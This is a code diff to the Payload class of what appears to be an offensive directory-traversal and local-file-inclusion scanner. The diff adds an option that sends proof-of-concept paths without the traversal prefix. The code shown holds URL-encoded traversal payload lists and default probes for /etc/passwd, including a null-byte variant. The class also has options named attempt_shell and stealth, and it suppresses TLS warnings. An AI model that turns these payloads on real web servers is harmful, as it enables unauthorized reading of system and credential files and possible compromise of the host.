@@ -18,7 +18,7 @@ import base64
 
 class Payload:
 
-	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False, attempt_shell=False, mode=0, force=False, batch=None, stealth=False):
+	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], override_poc=False, verbosity=1, proxies=False, crawler=False, attempt_shell=False, mode=0, force=False, batch=None, stealth=False):
 		requests.packages.urllib3.disable_warnings() # Comment out to stop suppressing warnings.
 		self.url = url.strip()
 		self.verbosity = verbosity
@@ -30,6 +30,7 @@ class Payload:
 		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
 		# poc -> Proof Of Concept (Change it if you want)
 		self.poc = poc
+		self.override_poc = override_poc
 
 		# Filter
 		# The quote method automatically url encodes the string except for the "."
@@ -221,9 +222,12 @@ class Payload:
 
 	# Checks for directory traversal
 	def dirTraversalCheck(self):
-		for i in self.linux_dirTraversal:
-			for n in self.poc:
-				compUrl = self.url + i + n
+		for traversal in self.linux_dirTraversal:
+			for poc in self.poc:
+				if not self.override_poc:
+					compUrl = self.url + traversal + poc
+				else:
+					compUrl = self.url + poc
 				if self.verbosity > 1:
 					print(colored('[*]', 'yellow', attrs=['bold']) + f' Testing: {compUrl}')
 				clean = self.hit(compUrl)
